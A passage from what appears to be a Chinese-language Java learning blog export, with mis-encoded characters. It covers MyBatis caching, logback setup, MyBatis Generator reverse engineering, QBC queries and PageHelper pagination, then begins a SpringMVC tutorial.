é»˜è®¤æ˜¯LRUï¼ˆæœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼‰ï¼Œå¯é€‰çš„æœ‰LFUï¼ˆæœ€ä¸å¸¸ä½¿ç”¨ï¼‰å’ŒFIFOï¼ˆå…ˆè¿›å…ˆå‡º |\n\n#### c.è®¾ç½®äºŒçº§ç¼“å­˜çš„ç±»å‹\n\nåœ¨xxxMapper.xmlæ–‡ä»¶ä¸­è®¾ç½®äºŒçº§ç¼“å­˜ç±»å‹\n\n```xml\n<cache type=\"org.mybatis.caches.ehcache.EhcacheCache\"/>\n```\n\n#### d.åŠ å…¥logbackæ—¥å¿—\n\nå­˜åœ¨SLF4Jæ—¶ï¼Œä½œä¸ºç®€æ˜“æ—¥å¿—çš„log4jå°†å¤±æ•ˆï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦å€ŸåŠ©SLF4Jçš„å…·ä½“å®ç°logbackæ¥æ‰“å°æ—¥å¿—ã€‚åˆ›å»ºlogbackçš„é…ç½®æ–‡ä»¶`logback.xml`ï¼Œåå­—å›ºå®šï¼Œä¸å¯æ”¹å˜\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration debug=\"true\">\n    <!-- æŒ‡å®šæ—¥å¿—è¾“å‡ºçš„ä½ç½® -->\n    <appender name=\"STDOUT\"\n              class=\"ch.qos.logback.core.ConsoleAppender\">\n        <encoder>\n            <!-- æ—¥å¿—è¾“å‡ºçš„æ ¼å¼ -->\n            <!-- æŒ‰ç…§é¡ºåºåˆ†åˆ«æ˜¯ï¼šæ—¶é—´ã€æ—¥å¿—çº§åˆ«ã€çº¿ç¨‹åç§°ã€æ‰“å°æ—¥å¿—çš„ç±»ã€æ—¥å¿—ä¸»ä½“å†…å®¹ã€æ¢è¡Œ -->\n            <pattern>[%d{HH:mm:ss.SSS}] [%-5level] [%thread] [%logger] [%msg]%n</pattern>\n        </encoder>\n    </appender>\n    <!-- è®¾ç½®å…¨å±€æ—¥å¿—çº§åˆ«ã€‚æ—¥å¿—çº§åˆ«æŒ‰é¡ºåºåˆ†åˆ«æ˜¯ï¼šDEBUGã€INFOã€WARNã€ERROR -->\n    <!-- æŒ‡å®šä»»ä½•ä¸€ä¸ªæ—¥å¿—çº§åˆ«éƒ½åªæ‰“å°å½“å‰çº§åˆ«å’Œåé¢çº§åˆ«çš„æ—¥å¿—ã€‚ -->\n    <root level=\"DEBUG\">\n        <!-- æŒ‡å®šæ‰“å°æ—¥å¿—çš„appenderï¼Œè¿™é‡Œé€šè¿‡â€œSTDOUTâ€å¼•ç”¨äº†å‰é¢é…ç½®çš„appender -->\n        <appender-ref ref=\"STDOUT\" />\n    </root>\n    <!-- æ ¹æ®ç‰¹æ®Šéœ€æ±‚æŒ‡å®šå±€éƒ¨æ—¥å¿—çº§åˆ« -->\n    <logger name=\"com.jianjian.mapper\" level=\"DEBUG\"/>\n</configuration>\n```\n\n## åä¸€ã€MyBatisçš„é€†å‘å·¥ç¨‹\n\n- æ­£å‘å·¥ç¨‹ï¼šå…ˆåˆ›å»ºJavaå®ä½“ç±»ï¼Œç”±æ¡†æ¶è´Ÿè´£æ ¹æ®å®ä½“ç±»ç”Ÿæˆæ•°æ®åº“è¡¨ã€‚Hibernateæ˜¯æ”¯æŒæ­£å‘å·¥ç¨‹çš„\n- é€†å‘å·¥ç¨‹ï¼šå…ˆåˆ›å»ºæ•°æ®åº“è¡¨ï¼Œç”±æ¡†æ¶è´Ÿè´£æ ¹æ®æ•°æ®åº“è¡¨ï¼Œåå‘ç”Ÿæˆå¦‚ä¸‹èµ„æºï¼š  \n  - Javaå®ä½“ç±»  \n  - Mapperæ¥å£  \n  - Mapperæ˜ å°„æ–‡ä»¶\n\n### 1.æ„å»ºé€†å‘å·¥ç¨‹\n\n####  a.æ·»åŠ ä¾èµ–å’Œæ’ä»¶         \n\n```xml\n   <dependencies>\n        <!-- MyBatisæ ¸å¿ƒä¾èµ–åŒ… -->\n        <dependency>\n            <groupId>org.mybatis</groupId>\n            <artifactId>mybatis</artifactId>\n            <version>3.5.9</version>\n        </dependency>\n        <!-- junitæµ‹è¯• -->\n        <dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>4.13.2</version>\n            <scope>test</scope>\n        </dependency>\n        <!-- MySQLé©±åŠ¨ -->\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>8.0.29</version>\n        </dependency>\n        <!-- log4jæ—¥å¿— -->\n        <dependency>\n            <groupId>log4j</groupId>\n            <artifactId>log4j</artifactId>\n            <version>1.2.17</version>\n        </dependency>\n    </dependencies>\n    <!-- æ§åˆ¶Mavenåœ¨æ„å»ºè¿‡ç¨‹ä¸­ç›¸å…³é…ç½® -->\n    <build>\n        <!-- æ„å»ºè¿‡ç¨‹ä¸­ç”¨åˆ°çš„æ’ä»¶ -->\n        <plugins>\n            <!-- å…·ä½“æ’ä»¶ï¼Œé€†å‘å·¥ç¨‹çš„æ“ä½œæ˜¯ä»¥æ„å»ºè¿‡ç¨‹ä¸­æ’ä»¶å½¢å¼å‡ºç°çš„ -->\n            <plugin>\n                <groupId>org.mybatis.generator</groupId>\n                <artifactId>mybatis-generator-maven-plugin</artifactId>\n                <version>1.3.0</version>\n                <!-- æ’ä»¶çš„ä¾èµ– -->\n                <dependencies>\n                    <!-- é€†å‘å·¥ç¨‹çš„æ ¸å¿ƒä¾èµ– -->\n                    <dependency>\n                        <groupId>org.mybatis.generator</groupId>\n                        <artifactId>mybatis-generator-core</artifactId>\n                        <version>1.3.2</version>\n                    </dependency>\n                    <!-- æ•°æ®åº“è¿æ¥æ±  -->\n                    <dependency>\n                        <groupId>com.mchange</groupId>\n                        <artifactId>c3p0</artifactId>\n                        <version>0.9.5.5</version>\n                    </dependency>\n                    <!-- MySQLé©±åŠ¨ -->\n                    <dependency>\n                        <groupId>mysql</groupId>\n                        <artifactId>mysql-connector-java</artifactId>\n                        <version>8.0.29</version>\n                    </dependency>\n                </dependencies>\n            </plugin>\n        </plugins>\n    </build>\n```\n\n#### b.åˆ›å»ºMyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n    <!--å¼•å…¥properties-->\n    <properties resource=\"jdbc.properties\"></properties>\n    <settings>\n        <!--å°†è¡¨ä¸­å­—æ®µçš„ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³°-->\n        <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n        <!--å¼€å¯å»¶è¿ŸåŠ è½½-->\n        <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n    </settings>\n    <!--è®¾ç½®åˆ«å-->\n    <typeAliases>\n        <package name=\"com.xxx.pojo\"/>\n    </typeAliases>\n    <!--è®¾ç½®è¿æ¥æ•°æ®åº“çš„ç¯å¢ƒ-->\n    <environments default=\"development\">\n        <environment id=\"development\">\n            <transactionManager type=\"JDBC\"/>\n            <dataSource type=\"POOLED\">\n                <property name=\"driver\" value=\"${jdbc.driver}\"/>\n                <property name=\"url\" value=\"${jdbc.url}\"/>\n                <property name=\"username\" value=\"${jdbc.username}\"/>\n                <property name=\"password\" value=\"${jdbc.password}\"/>\n            </dataSource>\n        </environment>\n    </environments>\n    <!--å¼•å…¥æ˜ å°„æ–‡ä»¶-->\n    <mappers>\n        <package name=\"com.xxx.mapper\"/>\n    </mappers>\n</configuration>\n```\n\njdbc.properties\n\n```properties\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/Mybatis\njdbc.username=root\njdbc.password=root\n```\n\n#### c.åˆ›å»ºé€†å‘å·¥ç¨‹çš„é…ç½®æ–‡ä»¶\n\næ–‡ä»¶åå¿…é¡»æ˜¯ï¼š`generatorConfig.xml`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\">\n<generatorConfiguration>\n    <!--\n    targetRuntime: æ‰§è¡Œç”Ÿæˆçš„é€†å‘å·¥ç¨‹çš„ç‰ˆæœ¬\n    MyBatis3Simple: ç”ŸæˆåŸºæœ¬çš„CRUDï¼ˆæ¸…æ–°ç®€æ´ç‰ˆï¼‰\n    MyBatis3: ç”Ÿæˆå¸¦æ¡ä»¶çš„CRUDï¼ˆå¥¢åå°Šäº«ç‰ˆï¼‰\n    -->\n    <context id=\"DB2Tables\" targetRuntime=\"MyBatis3Simple\">\n        <!-- æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ -->\n        <jdbcConnection driverClass=\"com.mysql.cj.jdbc.Driver\"\n                        connectionURL=\"jdbc:mysql://localhost:3306/Mybatis\"\n                        userId=\"root\"\n                        password=\"root\">\n        </jdbcConnection>\n        <!-- javaBeançš„ç”Ÿæˆç­–ç•¥-->\n        <javaModelGenerator targetPackage=\"com.jianjian.pojo\"\n                            targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n            <property name=\"trimStrings\" value=\"true\" />\n        </javaModelGenerator>\n        <!-- SQLæ˜ å°„æ–‡ä»¶çš„ç”Ÿæˆç­–ç•¥ -->\n        <sqlMapGenerator targetPackage=\"com.jianjian.mapper\"\n                         targetProject=\"./src/main/resources\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </sqlMapGenerator>\n        <!-- Mapperæ¥å£çš„ç”Ÿæˆç­–ç•¥ -->\n        <javaClientGenerator type=\"XMLMAPPER\"\n                             targetPackage=\"com.jianjian.mapper\"\n                             targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </javaClientGenerator>\n        <!-- é€†å‘åˆ†æçš„è¡¨ -->\n        <!-- tableNameè®¾ç½®ä¸º*å·ï¼Œå¯ä»¥å¯¹åº”æ‰€æœ‰è¡¨ï¼Œæ­¤æ—¶ä¸å†™domainObjectName -->\n        <!-- domainObjectNameå±æ€§æŒ‡å®šç”Ÿæˆå‡ºæ¥çš„å®ä½“ç±»çš„ç±»å -->\n        <table tableName=\"t_emp\" domainObjectName=\"Emp\"/>\n        <table tableName=\"t_dept\" domainObjectName=\"Dept\"/>\n    </context>\n</generatorConfiguration>\n```\n\n#### d.æ‰§è¡ŒMBGæ’ä»¶çš„generateç›®æ ‡\n\nåŒå‡»è¿è¡Œ\n\n![](https://img.jwt1399.top/img/202205262019216.png)\n\nè¿è¡Œç»“æœ\n\n![](https://img.jwt1399.top/img/202205262019231.png)\n\nç”Ÿæˆçš„å®ä½“ç±»éœ€è¦æ‰‹åŠ¨æ·»åŠ æ„é€ å™¨ã€toStringæ–¹æ³•\n\nä¸€èˆ¬ä½¿ç”¨å¥¢åå°Šäº«ç‰ˆï¼Œå³ targetRuntimeè®¾ç½®ä¸ºMyBatis3\n\n### 2.QBCæŸ¥è¯¢\n\nQBC å³ Quary By Criteriaï¼Œåœ¨sqlè¯­å¥ç›¸å½“äºæŸ¥è¯¢æ¡ä»¶ã€‚QBCæŸ¥è¯¢æ˜¯å°†æŸ¥è¯¢æ¡ä»¶é€šè¿‡Javaå¯¹è±¡è¿›è¡Œæ¨¡å—åŒ–å°è£…ã€‚\n\n- `selectByExample`ï¼šæŒ‰æ¡ä»¶æŸ¥è¯¢ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªexampleå¯¹è±¡æˆ–è€…nullï¼›å¦‚æœä¼ å…¥ä¸€ä¸ªnullï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰æ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯æŸ¥è¯¢æ‰€æœ‰æ•°æ®\n- `example.createCriteria().xxx`ï¼šåˆ›å»ºæ¡ä»¶å¯¹è±¡ï¼Œé€šè¿‡andXXXæ–¹æ³•ä¸ºSQLæ·»åŠ æŸ¥è¯¢æ·»åŠ ï¼Œæ¯ä¸ªæ¡ä»¶ä¹‹é—´æ˜¯andå…³ç³»\n- `example.or().xxx`ï¼šå°†ä¹‹å‰æ·»åŠ çš„æ¡ä»¶é€šè¿‡oræ‹¼æ¥å…¶ä»–æ¡ä»¶\n\n```java\n@Test\npublic void testMBG() throws IOException {\n  InputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n  SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n  SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n  SqlSession sqlSession = sqlSessionFactory.openSession(true);\n  EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\n  EmpExample example = new EmpExample();\n  //åå­—ä¸ºå¼ ä¸‰ï¼Œä¸”å¹´é¾„å¤§äºç­‰äº20\n  example.createCriteria().andEmpNameEqualTo(\"å¼ ä¸‰\").andAgeGreaterThanOrEqualTo(20);\n  //æˆ–è€…didä¸ä¸ºç©º\n  example.or().andDidIsNotNull();\n\n  List<Emp> emps = mapper.selectByExample(example);\n  emps.forEach(System.out::println);\n}\n```\n\n### 3.QBCå¢æ”¹\n\n- `updateByPrimaryKey`ï¼šé€šè¿‡ä¸»é”®è¿›è¡Œæ•°æ®ä¿®æ”¹ï¼Œå¦‚æœæŸä¸€ä¸ªå€¼ä¸ºnullï¼Œä¹Ÿä¼šå°†å¯¹åº”çš„å­—æ®µæ”¹ä¸ºnull\n\n`mapper.updateByPrimaryKey(new Emp(1,\"admin\",22,null,\"456@qq.com\",3));`\n\n![](https://img.jwt1399.top/img/202205262040444.png)\n\n- `updateByPrimaryKeySelective()`ï¼šé€šè¿‡ä¸»é”®è¿›è¡Œé€‰æ‹©æ€§æ•°æ®ä¿®æ”¹ï¼Œå¦‚æœæŸä¸ªå€¼ä¸ºnullï¼Œåˆ™ä¸ä¿®æ”¹è¿™ä¸ªå­—æ®µ\n\n`mapper.updateByPrimaryKeySelective(new Emp(2,\"admin2\",22,null,\"456@qq.com\",3));`\n\n![](https://img.jwt1399.top/img/202205262040097.png)\n\n## åäºŒã€åˆ†é¡µæ’ä»¶\n\n### 1.é…ç½®\n\n#### a.æ·»åŠ ä¾èµ–\n\n```xml\n<!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper -->\n<dependency>\n\t<groupId>com.github.pagehelper</groupId>\n\t<artifactId>pagehelper</artifactId>\n\t<version>5.2.0</version>\n</dependency>\n```\n\n#### b.é…ç½®åˆ†é¡µæ’ä»¶\n\nåœ¨MyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼ˆmybatis-config.xmlï¼‰ä¸­é…ç½®æ’ä»¶\n\n```xml\n<plugins>\n\t<!--è®¾ç½®åˆ†é¡µæ’ä»¶-->\n\t<plugin interceptor=\"com.github.pagehelper.PageInterceptor\"></plugin>\n</plugins>\n```\n\n### 2.ä½¿ç”¨\n\nåœ¨æŸ¥è¯¢åŠŸèƒ½ä¹‹å‰ä½¿ç”¨`PageHelper.startPage(int pageNum, int pageSize)`å¼€å¯åˆ†é¡µåŠŸèƒ½\n\n- pageNumï¼šå½“å‰é¡µçš„é¡µç   \n- pageSizeï¼šæ¯é¡µæ˜¾ç¤ºçš„æ¡æ•°\n\n#### a.ç›´æ¥è¾“å‡º\n\n```java\n@Test\npublic void testPageHelper() throws IOException {\n\tInputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n\tSqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n\tSqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n\tSqlSession sqlSession = sqlSessionFactory.openSession(true);\n\tEmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\t//è®¿é—®ç¬¬ä¸€é¡µï¼Œæ¯é¡µå››æ¡æ•°æ®\n\tPage<Object> page = PageHelper.startPage(1, 4);\n\tList<Emp> emps = mapper.selectByExample(null);\n\t//åœ¨æŸ¥è¯¢åˆ°Listé›†åˆåï¼Œæ‰“å°åˆ†é¡µæ•°æ®\n\tSystem.out.println(page);\n}\n```\n\n- åˆ†é¡µç›¸å…³æ•°æ®ï¼š\n\n```java\nPage{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false}[Emp{eid=1, empName='admin', age=22, sex='ç”·', email='456@qq.com', did=3}, Emp{eid=2, empName='admin2', age=22, sex='ç”·', email='456@qq.com', did=3}, Emp{eid=3, empName='ç‹äº”', age=12, sex='å¥³', email='123@qq.com', did=3}, Emp{eid=4, empName='èµµå…­', age=32, sex='ç”·', email='123@qq.com', did=1}]\n```\n\n#### b.ä½¿ç”¨PageInfo\n\nåœ¨æŸ¥è¯¢è·å–listé›†åˆä¹‹åï¼Œä½¿ç”¨`PageInfo<T> pageInfo = new PageInfo<>(List<T> list, intnavigatePages)`è·å–åˆ†é¡µç›¸å…³æ•°æ®\n\n```java\n@Test\npublic void testPageHelper() throws IOException {\n\tInputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n\tSqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n\tSqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n\tSqlSession sqlSession = sqlSessionFactory.openSession(true);\n\tEmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\tPageHelper.startPage(1, 4);\n\tList<Emp> emps = mapper.selectByExample(null);\n\tPageInfo<Emp> page = new PageInfo<>(emps,5);\n\tSystem.out.println(page);\n}\n```\n\n- åˆ†é¡µç›¸å…³æ•°æ®ï¼š\n\n```java\nPageInfo{\npageNum=1, pageSize=4, size=4, startRow=1, endRow=4, total=8, pages=2, \nlist=Page{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false}[Emp{eid=1, empName='admin', age=22, sex='ç”·', email='456@qq.com', did=3}, Emp{eid=2, empName='admin2', age=22, sex='ç”·', email='456@qq.com', did=3}, Emp{eid=3, empName='ç‹äº”', age=12, sex='å¥³', email='123@qq.com', did=3}, Emp{eid=4, empName='èµµå…­', age=32, sex='ç”·', email='123@qq.com', did=1}], \nprePage=0, nextPage=2, isFirstPage=true, isLastPage=false, hasPreviousPage=false, hasNextPage=true, navigatePages=5, navigateFirstPage=1, navigateLastPage=2, navigatepageNums=[1, 2]}\n```\n\n- listï¼šåˆ†é¡µä¹‹åçš„æ•°æ®  \n- navigatePagesï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç æ•°\n- å…¶ä¸­listä¸­çš„æ•°æ®ç­‰åŒäºæ–¹æ³•aä¸­ç›´æ¥è¾“å‡ºçš„pageæ•°æ®\n\n### 3.å¸¸ç”¨æ•°æ®\n\n- pageNumï¼šå½“å‰é¡µçš„é¡µç   \n- pageSizeï¼šæ¯é¡µæ˜¾ç¤ºçš„æ¡æ•°  \n- sizeï¼šå½“å‰é¡µæ˜¾ç¤ºçš„çœŸå®æ¡æ•°  \n- totalï¼šæ€»è®°å½•æ•°  \n- pagesï¼šæ€»é¡µæ•°  \n- prePageï¼šä¸Šä¸€é¡µçš„é¡µç   \n- nextPageï¼šä¸‹ä¸€é¡µçš„é¡µç \n- isFirstPage/isLastPageï¼šæ˜¯å¦ä¸ºç¬¬ä¸€é¡µ/æœ€åä¸€é¡µ  \n- hasPreviousPage/hasNextPageï¼šæ˜¯å¦å­˜åœ¨ä¸Šä¸€é¡µ/ä¸‹ä¸€é¡µ  \n- navigatePagesï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç æ•°  \n- navigatepageNumsï¼šå¯¼èˆªåˆ†é¡µçš„é¡µç ï¼Œ\\[1,2,3,4,5]\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MyBatis"],"categories":["SQL"]},{"title":"SpringMVC","url":"/posts/4780.html","content":"\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpringMVCã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸ“å­¦ä¹ èµ„æ–™ï¼š[å°šç¡…è°·-SpringMVCæ•™ç¨‹](https://www.bilibili.com/video/BV1Ry4y1574R/)\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡7å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š05-07\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š05-20\n- [x] ğŸ€æ€»ç»“ï¼šæ²¡æœ‰æŒ‰æ—¶å®Œæˆç›®æ ‡ï¼Œè¿™æ®µæ—¶é—´çŠ¶æ€å¾ˆä¸å¥½ï¼Œä¸­é—´é¢“åºŸäº†æ¥è¿‘ä¸€å‘¨ï¼ŒåˆèŠ±äº†ä¸€äº›æ—¶é—´çœ‹è®ºæ–‡ï¼Œä¸¥é‡è¶…æ—¶ï¼Œä½†å®é™…ç”¨æ—¶å¤§æ¦‚7å¤©ï¼Œæ¥ä¸‹æ¥æ…¢æ…¢è°ƒæ•´è‡ªå·±å§ï¼Œå¸Œæœ›å¿«ç‚¹æ‰¾å›é«˜æ•ˆçš„çŠ¶æ€ã€‚æœ¬ç¬”è®°æ˜¯æ ¹æ®å°šç¡…è°·SpringMVCè¯¾ç¨‹æä¾›ç¬”è®°è¿›è¡Œæ•´ç†\n\n## ä¸€ã€SpringMVCç®€ä»‹\n\n### 1ã€ä»€ä¹ˆæ˜¯MVC\n\nMVC æ˜¯ä¸€ç§è½¯ä»¶æ¶æ„çš„æ€æƒ³ï¼Œå°†è½¯ä»¶æŒ‰ç…§æ•°æ®æ¨¡å‹å±‚(**M**odel)ã€è§†å›¾å±‚(**V**iew)ã€æ§åˆ¶å±‚(**C**ontroller)æ¥åˆ’åˆ†ï¼Œä½¿ç”¨ MVC çš„ç›®çš„æ˜¯å°† M å’Œ V å®ç°ä»£ç åˆ†ç¦»ã€‚\n\n- Mï¼šæ¨¡å‹å±‚ï¼ŒæŒ‡å·¥ç¨‹ä¸­çš„ JavaBeanï¼Œä½œç”¨æ˜¯å¤„ç†æ•°æ®\n\n  - JavaBeanåˆ†ä¸ºä¸¤ç±»ï¼š\n\n    - ä¸€ç±»ç§°ä¸ºå®ä½“ç±»Beanï¼šä¸“é—¨å­˜å‚¨ä¸šåŠ¡æ•°æ®çš„ï¼Œå¦‚ Studentã€User ç­‰\n\n    - ä¸€ç±»ç§°ä¸ºä¸šåŠ¡å¤„ç† Beanï¼šæŒ‡ Service æˆ– Dao å¯¹è±¡ï¼Œä¸“é—¨ç”¨äºå¤„ç†ä¸šåŠ¡é€»è¾‘å’Œæ•°æ®è®¿é—®\n\n\n- Vï¼šè§†å›¾å±‚ï¼ŒæŒ‡å·¥ç¨‹ä¸­çš„htmlæˆ–jspç­‰é¡µé¢ï¼Œä½œç”¨æ˜¯ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ï¼Œå±•ç¤ºæ•°æ®\n\n- Cï¼šæ§åˆ¶å±‚ï¼ŒæŒ‡å·¥ç¨‹ä¸­çš„servletï¼Œä½œç”¨æ˜¯æ¥æ”¶è¯·æ±‚å’Œå“åº”æµè§ˆå™¨\n\n**MVCçš„å·¥ä½œæµç¨‹ï¼š**\n\nç”¨æˆ·é€šè¿‡ View å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸­è¯·æ±‚è¢« Controller æ¥æ”¶ï¼ŒController è°ƒç”¨ç›¸åº”çš„ Model å¤„ç†è¯·æ±‚ï¼Œå¤„ç†å®Œæ¯•å°†ç»“æœè¿”å›åˆ° Controllerï¼ŒController å†æ ¹æ®è¯·æ±‚å¤„ç†çš„ç»“æœæ‰¾åˆ°ç›¸åº”çš„ View ï¼Œæ¸²æŸ“æ•°æ®åæœ€ç»ˆå“åº”ç»™æµè§ˆå™¨\n\n### 2ã€ä»€ä¹ˆæ˜¯SpringMVC\n\nSpring MVC æ˜¯ Spring æä¾›çš„ä¸€ä¸ªåŸºäº MVC è®¾è®¡æ¨¡å¼çš„è½»é‡çº§ Web å¼€å‘æ¡†æ¶ï¼Œæœ¬è´¨ä¸Šç›¸å½“äº Servletã€‚\n\n**SpringMVCçš„ç‰¹ç‚¹**\n\n- **Spring å®¶æ—åŸç”Ÿäº§å“**ï¼Œä¸ IOC å®¹å™¨ç­‰åŸºç¡€è®¾æ–½æ— ç¼å¯¹æ¥\n- **åŸºäºåŸç”Ÿçš„Servlet**ï¼Œé€šè¿‡äº†åŠŸèƒ½å¼ºå¤§çš„**å‰ç«¯æ§åˆ¶å™¨DispatcherServlet**ï¼Œå¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œç»Ÿä¸€å¤„ç†\n- **æ¸…æ™°åœ°è§’è‰²åˆ’åˆ†**ï¼Œåœ¨ Modelã€View å’Œ Controller æ–¹é¢æä¾›äº†ä¸€ä¸ªéå¸¸æ¸…æ™°çš„è§’è‰²åˆ’åˆ†ï¼Œè¿™ 3 ä¸ªæ–¹é¢çœŸæ­£æ˜¯å„å¸å…¶èŒï¼Œå„è´Ÿå…¶è´£ã€‚\n- **ä»£ç æ¸…æ–°ç®€æ´**ï¼Œå¤§å¹…åº¦æå‡å¼€å‘æ•ˆç‡\n- å†…éƒ¨ç»„ä»¶åŒ–ç¨‹åº¦é«˜ï¼Œå¯æ’æ‹”å¼ç»„ä»¶**å³æ’å³ç”¨**ï¼Œæƒ³è¦ä»€ä¹ˆåŠŸèƒ½é…ç½®ç›¸åº”ç»„ä»¶å³å¯\n- **æ€§èƒ½å“è‘—**ï¼Œå°¤å…¶é€‚åˆç°ä»£å¤§å‹ã€è¶…å¤§å‹äº’è”ç½‘é¡¹ç›®è¦æ±‚\n\n## äºŒã€å¿«é€Ÿå…¥é—¨\n\n1. åˆ›å»º Web åº”ç”¨\n2. å¼•å…¥ä¾èµ–\n3. Spring MVC é…ç½®\n4. åˆ›å»º Controller\n5. åˆ›å»º View\n6. éƒ¨ç½²è¿è¡Œ\n\n### 1ã€åˆ›å»º Web é¡¹ç›®\n\n- æ‰“å¼€ IDEAï¼Œé€‰æ‹© Java Enterprise\n- æ¨¡ç‰ˆé€‰æ‹© Web åº”ç”¨ç¨‹åº\n- åº”ç”¨ç¨‹åºæœåŠ¡å™¨é€‰æ‹© Tomcat\n- æ„å»ºç³»ç»Ÿé€‰æ‹© Maven\n- ä¾èµ–é¡¹å‹¾é€‰ Servlet å’Œ Thymeleaf\n- åˆ é™¤æ‰ index.jsp\n\n### 2ã€å¼•å…¥ä¾èµ–\n\n```xml\n<dependencies>\n    <!-- SpringMVC -->\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.1</version>\n    </dependency>\n\n    <!-- æ—¥å¿— -->\n    <dependency>\n        <groupId>ch.qos.logback</groupId>\n        <artifactId>logback-classic</artifactId>\n        <version>1.2.3</version>\n    </dependency>\n\n    <!-- Spring5å’ŒThymeleafæ•´åˆåŒ… -->\n    <dependency>\n        <groupId>org.thymeleaf</groupId>\n        <artifactId>thymeleaf-spring5</artifactId>\n        <version>3.0.12.RELEASE</version>\n    </dependency>\n</dependencies>\n```\n\n### 3ã€Spring MVC é…ç½®\n\nSpring MVC æ˜¯åŸºäº Servlet çš„ï¼ŒDispatcherServlet æ˜¯æ•´ä¸ª Spring MVC æ¡†æ¶çš„æ ¸å¿ƒï¼Œä¸»è¦è´Ÿè´£æˆªè·è¯·æ±‚å¹¶å°†å…¶åˆ†æ´¾ç»™ç›¸åº”çš„å¤„ç†å™¨å¤„ç†ã€‚æ‰€ä»¥é…ç½® Spring MVCï¼Œé¦–å…ˆè¦å®šä¹‰ DispatcherServletã€‚è·Ÿæ‰€æœ‰ Servlet ä¸€æ ·ï¼Œç”¨æˆ·å¿…é¡»åœ¨ **web.xml** 